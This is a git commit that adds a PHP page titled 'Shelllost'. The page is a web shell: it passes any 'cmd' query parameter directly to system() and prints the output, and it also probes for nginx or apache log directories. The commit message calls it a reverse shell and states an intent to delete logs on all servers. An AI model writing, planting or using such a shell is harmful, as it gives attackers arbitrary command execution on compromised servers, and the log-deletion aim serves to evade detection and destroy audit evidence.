e7c71cea6c50e30afaaff12276377b374afc210d
jul10l14 <jul10l1r4@ufrn.edu.br>
2019-02-27 04:05:33 -0300

    Reverse Shell Ok, we need delete logs for all servers...

--- PHP/main.php
+++ PHP/main.php
@@ -1,3 +1,28 @@
 <?php
-
+  $command = isset($_GET['cmd']) ? $_GET['cmd'] : null;
+  if ( exec('[ -d /var/log/nginx ] && printf "Nginx" || printf "n"') == "Nginx" ){
+    echo 'Nginx';
+  }else if ( exec('[ -d /var/log/apache* ] && printf "Apache" || printf "n"') == "Apache" ){
+    echo 'Apache';
+  }else {
+    echo "Não identificado servidor";
+  }
 ?>
+<DOCTYPE html>
+<html>
+  <head>
+    <title>Shelllost</title>
+    <meta charset="utf-8"/>
+  </head>
+  <body>
+    <h1>Welcome to reversing shell</h1>
+    <form method='get' action='#'>
+      <input type='text' style='' name='cmd' placeholder='type command, like: ls'/>
+      <input type='submit'/>
+    </form>
+
+    <div id=out>
+      <pre><?= system($command) ?></pre>
+    </div>
+  </body>
+</html>
